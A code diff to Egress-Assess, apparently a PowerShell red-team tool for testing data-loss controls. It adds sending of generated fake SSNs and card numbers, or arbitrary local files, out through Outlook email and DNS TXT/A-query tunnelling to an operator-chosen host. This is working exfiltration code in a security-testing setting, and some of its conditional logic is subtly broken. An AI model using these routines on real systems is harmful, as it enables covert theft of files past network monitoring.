@@ -61,13 +61,16 @@ function Invoke-EgressAssess
     The port is if you wish to specify a non-standard port for data transfer(s)
     
 .Parameter SMTP_To
-    The port is if you wish to specify a non-standard port for data transfer(s)
+    The "TO" Address you wish to specify for SMTP client
 
 .Parameter SMTP_From
-    The port is if you wish to specify a non-standard port for data transfer(s)
+    The "FROM" Address you wish to specify for SMTP client
 
 .Parameter SMTP_Subject
-    The port is if you wish to specify a non-standard port for data transfer(s)
+    The subject you wish to specify for SMTP client
+
+.Parameter stacked
+    Flag to enable stacked (multiple) DNS TXT Queries per packet
 
 .Example
     Import-Module Egress-Assess.ps1
@@ -108,6 +111,8 @@ function Invoke-EgressAssess
         [Parameter(Mandatory = $False)]
         [string]$SMTP_Subject,
         [Parameter(Mandatory = $False)]
+        [switch]$stacked,
+        [Parameter(Mandatory = $False)]
         [int]$Size = 1,
         [Parameter(Mandatory = $False)]
         [int]$Loops = 1,
@@ -140,6 +145,10 @@ function Invoke-EgressAssess
                     Write-Verbose "[*] ICMP server *possibly* running."
                     Return
                 }
+                elseif ($client -eq "smtpoutlook")
+                {
+                    Write-Verbose "[*] Attempting to use Organization's Mail Server, so ensure MX record for Egress-Assess server is set"
+                }  
                 elseif ($client -eq "dnstxt" -or $client -eq "dnsresolved")
                 {
                     <#Note: Need to troubleshoot DNS checks more.
@@ -187,7 +196,7 @@ function Invoke-EgressAssess
                         {
                             $port = 22
                         }
-                        elseif ($client -eq "smtp")
+                        elseif ($client -eq "smtp" )
                         {
                             $port = 25
                         }
@@ -324,11 +333,10 @@ function Invoke-EgressAssess
         {
             
             $script:AllCC = @()
-            $script:list = New-Object System.Collections.Generic.List[System.String]
-            
-            Write-Verbose "[*] Generating Credit Cards............."
-            
             $num = [math]::Round($Size * 10000 * 3)
+            Write-Verbose "[*] Generating $Size MB of Credit Cards ($num)..."
+            $list = New-Object System.Collections.Generic.List[System.String]
+            
             $intCardType = 0
             for ($countercc = 0; $countercc -lt $num; $countercc++)
             {
@@ -365,16 +373,16 @@ function Invoke-EgressAssess
                 if ($randNumString.length -eq 15)
                 {
                     $randCC = "$($randNumString.substring(0,4))-$($randNumString.substring(4,6))-$($randNumString.substring(10,5))"
-                    $script:list.Add($randCC)
+                    $list.Add($randCC)
                 }
                 elseif ($randNumString.length -eq 16)
                 {
                     $randCC = "$($randNumString.substring(0,4))-$($randNumString.substring(4,4))-$($randNumString.substring(8,4))-$($randNumString.substring(12,4))"
-                    $script:list.Add($randCC)
+                    $list.Add($randCC)
                 }
             }
-            $script:AllCC = $Script:list.ToArray()
-            $script:AllCC | Out-File C:\Users\ctrun\Desktop\test.txt
+            $script:AllCC = $list.ToArray()
+            $script:AllCC | Out-File CCData.txt
         }
         
         function Generate-Identity
@@ -1677,7 +1685,124 @@ function Invoke-EgressAssess
             
         }
         
-        function Use-SMTP
+        function Use-SMTPOutlook
+        {
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $SMTPData = $AllSSN
+                }
+                elseif ($Datatype -eq "ni")
+                {
+                    Generate-NI
+                    $SMTPData = $AllNI
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $SMTPData = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $SMTPData = $AllNames
+                }
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $filetransfer = $True
+                    $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                }
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+            }
+
+            $check_outlook = get-process -name outlook -ea silentlycontinue
+            if ($check_outlook) {
+		        $outlook_running = $true
+            }
+            else 
+            {
+                Write-Verbose "[*] Outlook is not running, Outlook will be started and may require user authentication to create session" 
+            	$outlook_running = $false
+	        }
+            
+            if ($IP -as [ipaddress] -as [bool] )
+            {
+               Write-Verbose "[*] -IP needs to be set as the Domain used to email to, not an actual IP address"
+               return
+            }
+           do
+            {
+                # https://community.spiceworks.com/how_to/150253-send-mail-from-powershell-using-outlook
+		Try
+                {
+                    #create COM object named Outlook 
+                    $Outlook = New-Object -ComObject Outlook.Application 
+                    #create Outlook MailItem named Mail using CreateItem() method 
+                    $Mail = $Outlook.CreateItem(0) 
+                    
+                    if (!$SMTP_To)
+                    {
+                        $Mail.To = "egress-assess@$IP"
+                    }
+                    else
+                    {
+                        $Mail.To = $SMTP_TO
+                    }
+                    #if (!$SMTP_From)
+                    #{
+                    #    $Mail.From = "tester@egress-assess.com"
+                    #}
+                    
+                    if (!$SMTP_Subject)
+                    {
+                        $Mail.Subject = "Egress-Assess Exfil Data vis SMTPOutlook"
+                    }
+                    else
+                    {
+                        $Mail.Subject = $SMTP_Subject
+                    }
+                    
+                    if ($filetransfer -eq $true)
+                    {
+                        $Mail.Body = "EgressAssess With Attachment"
+                        $Mail.Attachments.Add($SourceFilePath)
+                        $mail.send() 
+                    }
+                    else
+                    {
+                        $Mail.Body = "$SMTPData"
+                        $Mail.send()
+                    }
+
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+
+	        #If outlook wasn't previousl running close out and clean up.
+	        if ( !$outlook_running ){
+                $Outlook.Quit() 
+	            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
+            }
+        }
+
+         function Use-SMTP
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
@@ -1887,8 +2012,10 @@ function Invoke-EgressAssess
         
         function Use-DNSTXT
         {
+        Param([bool]$txtmode=$true);
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
+                $filetransfer = $false
                 if ($Datatype -eq "ssn")
                 {
                     Generate-SSN
@@ -1915,14 +2042,7 @@ function Invoke-EgressAssess
                     if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
                     $filetransfer = $true
 
-                    #$SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
-                    #$FileName = get-childitem $Datatype | % { $_.Name }
                     $DNSData = [io.File]::ReadAllbytes($DataType)
-                    #$DNSData = [System.Convert]::ToBase64String($fB)
-
-                    #Write-Verbose "[*] You did not provide a data type to generate."
-                    #Write-Verbose "[*] DNS file transfers currently not supported."
-                    #break
                 }
             }
             Do
@@ -1934,36 +2054,50 @@ function Invoke-EgressAssess
                         $Port = 53
                     }
 
+                    if (!$DefaultLength)
+                    {
+                        $DefaultLength = 35
+                    }
+                    if ($DefaultLength -gt 36)
+                    {
+                        $DefaultLength = 36
+                        Write-Verbose "[!] DNS payload length larger than 36 characters, setting to DNS safe value of 36"
+                    }
+
+                    if (!$stacked)
+                    {
+                        $stacked = $False
+                    }
+
                     if ($filetransfer)
                     {
-                        [Collections.Generic.List[byte]]$aaa = $DNSData    
+                        [Collections.Generic.List[byte]]$aaa = $DNSData  
+                        $filename = (Get-ChildItem $Datatype).Name  
                     }
                     else
                     {
-                        [Collections.Generic.List[char]]$aaa = $DNSData
+                        [Collections.Generic.List[byte]]$aaa = [System.Text.Encoding]::ASCII.GetBytes($DNSData)
                     }
 
-                    [int]$DefaultLength = 35
                     if ($DefaultLength -gt $aaa.Count)
                     {
                         $DefaultLength = $aaa.Count
                     }
+
                     [int]$ByteReader = 0
                     
                     $PacketNumber = 1
                     
-                    if ($aaa.Count % $DefaultLength -eq 0)
-                    {
-                        [int]$TotalPackets = $($aaa.Count) / $DefaultLength
-                    }
-                    Else
-                    {
-                        [int]$TotalPackets = $($aaa.Count) / $DefaultLength
-                        $TotalPackets += 1
-                    }
-                    $CurrentTotal = $TotalPackets
+                    [int]$TotalPackets = [math]::floor([decimal]$($aaa.Count) / [decimal]$DefaultLength)
                     
-                    While ($ByteReader -lt ($aaa.Count))
+                    if ($aaa.Count % $DefaultLength -ne 0)
+                    {
+                        [int]$TotalPackets +=1
+                    }
+
+                    $CurrentTotal = $TotalPackets
+                    $EncodedData=""
+                    While ($ByteReader -le ($aaa.Count))
                     {
                         try
                         {
@@ -1971,23 +2105,56 @@ function Invoke-EgressAssess
                             {
                                 $DefaultLength = $aaa.count - $ByteReader
                             }
-                            $preamble=""
 
+                            $preamble=""
+                            $DataBytes = @()                          
                             if ($filetransfer)
                             {
-                                $preamble = $PacketNumber.ToString()+".:|:."
+                                $preamble = ".:|:."
+                                [Collections.Generic.List[byte]]$pBytes = [bitconverter]::GetBytes($PacketNumber)
+                                $pBytes.Reverse()
+                                $DataBytes += $pBytes
                             }
-
-                            $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($preamble)
-                            $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
-                            $EncodedData = [System.Convert]::ToBase64String( $DataBytes)
                             
-                            Send-DNSPacket $EncodedData $true
+                            $DataBytes += [System.Text.Encoding]::UTF8.GetBytes($preamble)
+                            $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
+                            
+                            $PacketsToSend = 1
 
-                            Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
+                            if($stacked)
+                            {
+                                if(!$txtmode)
+                                {
+                                    Write-Verbose "[!] Stacked Queries not support with DNS Resolved, setting packets to send to 1"
+                                }
+                                else
+                                {
+                                    $PacketsToSend = 7
+                                }
+                            }
+                            $EncodedData += [System.Convert]::ToBase64String( $DataBytes)
+                            if (!$txtmode)
+                            {
+                                if ($filetransfer)
+                                {
+                                    $EncodedData += "." + [System.Convert]::ToBase64String( [System.Text.encoding]::ASCII.GetBytes($filename) )
+                                }
+                                $EncodedData = $EncodedData -replace "=", ".---"
+                                $EncodedData += ".$IP"
+                            }
+                            $EncodedData += "`n"
+                            if (($PacketNumber % $PacketsToSend -eq 0) -or ($PacketNumber -eq $TotalPackets))
+                            {
+                               $EncodedData = $EncodedData.SubString(0, $EncodedData.Length-1)
+
+                               Send-DNSPacket $EncodedData $txtmode
+                               $EncodedData=""
+                               Write-Verbose "[*] Sending burst data (up to $PacketsToSend) .... $PacketNumber/$TotalPackets"
+                               Start-Sleep -Milliseconds 10
+                            }
                             $PacketNumber += 1
+                            if ($PacketNumber -gt $TotalPackets) { break}
                             $ByteReader += $DefaultLength
-                            Start-Sleep -Milliseconds 100
                         }
                         catch
                         {
@@ -2001,9 +2168,33 @@ function Invoke-EgressAssess
                     #send last packet with filename
                     try{
                         #filename limited to 63 - ENDTHISFILETRANSMISSIONEGRESSASSESS.length.  we might have to send chunks over 
-                        $filename = (Get-ChildItem $Datatype).Name
-                        $EncodedData = "ENDTHISFILETRANSMISSIONEGRESSASSESS"+ $filename #[System.Text.Encoding]::UTF8.GetBytes("ENDTHISFILETRANSMISSIONEGRESSASSESS"+$DataType)
-                        Send-DNSPacket $EncodedData $true
+                        if ($filetransfer)
+                        {
+                            Start-Sleep 1
+                            for($i = 0; $i -lt 5; $i++)
+                            {
+                                $EncodedData = "ENDTHISFILETRANSMISSIONEGRESSASSESS"
+                                if ($txtmode)
+                                {
+                                    $EncodedData += $filename
+                                    
+                                }
+                                else
+                                {
+                                    $EncodedData += "." + [System.Convert]::ToBase64String( [System.Text.encoding]::ASCII.GetBytes($filename) )
+                                    $EncodedData = $EncodedData -replace "=", ".---"
+                                    $EncodedData += ".$IP"
+                                }
+                                $response = Send-DNSPacket $EncodedData $txtmode
+                                if ($response.Count -gt 0)
+                                {
+                                    #$response
+                                    break
+                                }
+                                $j = 4 - $i
+                                Write-Verbose "[!] Could not confirm file write trigger, trying $j more times"
+                            }
+                        }
                     }
                     catch
                     {
@@ -2011,84 +2202,6 @@ function Invoke-EgressAssess
                     }
 
 
-                }
-                catch
-                {
-                    $ErrorMessage = $_.Exception.Message
-                    Write-Verbose "[*] Error, tranfer failed with error:"
-                    Write-Verbose $ErrorMessage
-                    Break
-                }
-                Write-Verbose "[*] Transfer complete!"
-                $loops--
-                Write-Verbose "[*] $loops loops remaining.."
-            }
-            While ($loops -gt 0)
-        }
-        
-        function Use-DNSResolved
-        {
-            if ($Datatype -contains "ssn" -or "cc" -or "identity")
-            {
-                if ($Datatype -eq "ssn")
-                {
-                    Generate-SSN
-                    [string]$DNSData = $AllSSN
-                }
-                elseif ($Datatype -eq "ni")
-                {
-                    Generate-NI
-                    [string]$DNSData = $AllNI
-                }
-                elseif ($Datatype -eq "cc")
-                {
-                    Generate-CreditCards
-                    [string]$DNSData = $AllCC
-                }
-                elseif ($Datatype -eq "identity")
-                {
-                    Generate-Identity
-                    [string]$DNSData = $AllNames
-                }
-                
-                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
-                {
-                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
-                    $filetransfer = $true
-
-                    $FileName = get-childitem $Datatype | % { $_.Name }
-                    $DNSData = [io.File]::ReadAllbytes($DataType)
-                }
-            }
-            else
-            {
-                Write-Verbose "[*] You did not provide a data type to generate."
-            }
-            Do
-            {
-                try
-                {
-                    Write-Verbose "Sending data via DNS..this may take awhile."
-                    $ByteReader = 0
-
-                    if ($filetransfer)
-                    {
-                        [Collections.Generic.List[byte]]$aaa = $DNSData    
-                    }
-                    else
-                    {
-                        [Collections.Generic.List[char]]$aaa = $DNSData
-                    }
-                    While ($ByteReader -le ($aaa.Count - 20))
-                    {
-                        $DataToSend = $aaa.GetRange($ByteReader, 20)
-                        $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataToSend)
-                        $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                        $EncodedData = $EncodedData -replace "=", ".---"
-                        Send-DNSPacket $EncodedData $false
-                        
-                        $ByteReader += 20
-                    }
                 }
                 catch
                 {
@@ -2215,7 +2328,8 @@ function Invoke-EgressAssess
                 break
             }
         }
-                function Send-DNSPacket
+        
+        function Send-DNSPacket
         {
             Param($dataX, $txt=$false);
 
@@ -2223,19 +2337,20 @@ function Invoke-EgressAssess
             {
                 $Port = 53
             }
-            #DNS TXT Query "Header"
-            #Trans ID  std query  
-            [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
-                    
-            #Ans       Auth    Add RR
-            [Byte[]]$Mess2= 0x00,0x00,0x00
-                    
-            #no. of queries
-            $Mess = $Mess + [Bitconverter]::GetBytes([int]1) +$Mess2
 
+            $dns_Servers = @()
+            
             if ($txt)
             {
-                $dns_Servers.Add(([System.Net.Dns]::GetHostAddresses($IP))[0].IPAddresstoString)
+                $dns_Servers += [System.Net.Dns]::GetHostAddresses($IP)[0].IPAddresstoString
+                #$dns_Servers
+                
+                #DNS TXT Query "Header"
+                             #Trans ID  std query  
+                [Byte[]]$Mess=0x00,0x01,0x05,0x00,0x00
+                    
+                                #Ans Auth Add RR
+                [Byte[]]$Mess2= 0x00,0x00,0x00
 
                 ###DNS TXT Query "Footer"
                 #suffix for each q
@@ -2244,12 +2359,21 @@ function Invoke-EgressAssess
             }
             else #type A
             {
+                #DNS A Query "Header"
+                #Trans ID  std query  
+                [Byte[]]$Mess=0x00,0x00,0x01,0x00,0x00
+                    
+                #Ans       Auth    Add RR
+                [Byte[]]$Mess2= 0x00,0x00,0x00
+
                 $dns_Servers =  ipconfig /all | where-object {$_ –match “DNS Servers”} | foreach-object{$_.Split(“:”)[1]}
                 
-                $postS = 0x00,0x00,0x10,0x00,0x01
-                $dataX +=".$IP"
+                $postS = 0x00,0x00,0x01,0x00,0x01
             }
             
+            $queries = $dataX.split("`n")
+                                                #no. of queries
+            $Mess = $Mess + [Bitconverter]::GetBytes($queries.Count) +$Mess2
             foreach($addr in $dns_servers)
             {
                 try
@@ -2266,28 +2390,52 @@ function Invoke-EgressAssess
                 $Sock.ReceiveTimeout=3000
 
                 [Byte[]]$fullQ = @()
- 
-                $data1 = [System.Text.Encoding]::ASCII.GetBytes($dataX)
-                $len1 = [bitconverter]::GetBytes($data1.Length)
-                $len1 = @($len1[0])
-                    
-                $fullQ = $len1
-                $fullQ+=$data1 
-                $fullQ+=$postS
-
-                $Buffer = $Mess + $fullQ
                 
+                foreach ($qq in $queries)
+                {
+                    $data2 = $qq.Split('.') #$dataX.Split('.')
+                    foreach ($d2 in $data2)
+                    {
+                        $data1 = [System.Text.Encoding]::ASCII.GetBytes($d2)
+                        $len1 = [bitconverter]::GetBytes($data1.Length)
+                        $len1 = @($len1[0])
+                        $fullQ+= $len1
+                        $fullQ+=$data1 
+                    }
+                   
+                    $fullQ+=$postS
+                }
+                $Buffer = $Mess + $fullQ
+
+                $Sock.ReceiveTimeout=1000
                 $Sock.Connect($End)
-                $Sock.Send($Buffer)
-                $Sock.Close()
-                break
+                $Sock.Send($Buffer) | out-null
+                if ($dataX.Contains("ENDTHISFILETRANSMISSIONEGRESSASSESS"))
+                {
+                    [byte[]] $resp = New-Object byte[] 1024
+                    start-sleep 1
+                    $Sock.Receive($resp)
+                    $Sock.Close()
+                    return $resp
+                }
+                else
+                {
+                    return $null
+                }
                 }
                 catch
                 {
-                    <#$ErrorMessage = $_.Exception.Message
-                    Write-Verbose "[*] Error, DNS failed with error:"
-                    Write-Verbose $ErrorMessage
-                    #>
+                    $ErrorMessage = $_.Exception.Message
+
+                    if ($ErrorMessage.ToString().Contains("An existing connection was forcibly closed by the remote host"))
+                    {
+                        #we will switch the logic once we hunt down the error we actually want to print
+                    }
+                    else
+                    {
+                        Write-Verbose "[*] Error, DNS failed with error:"
+                        Write-Verbose $ErrorMessage
+                    }
                 }
             }
         }
@@ -2311,6 +2459,10 @@ function Invoke-EgressAssess
         {
             Use-Ftp
         }
+        elseif ($client -eq "smtpoutlook")
+        {
+            Use-SMTPOutlook
+        }
         elseif ($client -eq "smtp")
         {
             Use-SMTP
@@ -2325,11 +2477,11 @@ function Invoke-EgressAssess
         }
         elseif ($client -eq "dnstxt")
         {
-            Use-DNSTXT
+            Use-DNSTXT $true
         }
         elseif ($client -eq "dnsresolved")
         {
-            Use-DNSResolved
+            Use-DNSTXT $false
         }
         elseif ($client -eq "smb")
         {
